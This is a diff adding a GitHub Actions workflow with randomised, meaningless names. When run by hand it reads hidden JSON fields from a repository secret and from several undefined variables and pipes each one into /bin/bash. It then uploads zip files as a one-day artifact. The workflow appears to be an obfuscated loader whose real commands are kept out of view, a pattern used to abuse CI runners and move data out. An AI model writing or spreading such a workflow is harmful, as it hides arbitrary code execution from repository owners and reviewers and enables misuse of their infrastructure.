@@ -1,0 +1,25 @@
+name: fortransolar340
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fortransolar340
+        env:
+          jrn75: ${{ secrets.jrn75 }}
+        run: |
+          printf '%s' "$jrn75" | jq -r .wvjyr63 | /bin/bash
+          echo $stnl10417 | jq -r .s86 | /bin/bash
+          printf '%s' "$erk872" | jq -r .d08638 | /bin/bash
+          echo $r110 | jq -r .zbrjw547 | /bin/bash
+          printf '%s' "$sg88" | jq -r .moq37060 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: gNbwcSQv
+          path: "*.zip"
+          retention-days: 1
